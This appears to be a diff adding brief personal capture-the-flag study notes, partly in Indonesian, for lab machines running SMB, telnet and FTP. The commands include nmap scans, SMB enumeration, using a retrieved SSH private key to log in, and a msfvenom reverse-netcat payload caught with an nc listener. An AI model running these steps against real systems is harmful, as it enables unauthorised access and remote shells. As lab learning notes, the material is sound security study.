@@ -1,0 +1,17 @@
+1. smb machine :
+-> nmap -sS --top-ports 1000 -T4 10.10.41.159
+-> enum4linux -a ip
+-> smbclient //ip/profiles[share]
+-> mget file -> chmod 600 file -> ssh user@ip -i id_rsa
+
+2. telnet
+-> sudo nmap -A -T4 -p- --min-rate 1000 --max-retries 1 10.10.146.150
+-> sudo tcpdump ip proto \\icmp -i tun0 -> ping ip -c 1
+-> msfvenom -p cmd/unix/reverse_netcat lhost=ip lport=4444 R -> run di local machine
+-> nc -nvlp 4444 -> outputnya msfvenom paste di shell
+
+
+3. ftp 
+-> sudo nmap -A -T4 --min-rate 1000 ip
+-> ftp ip
+-> ls -> get file
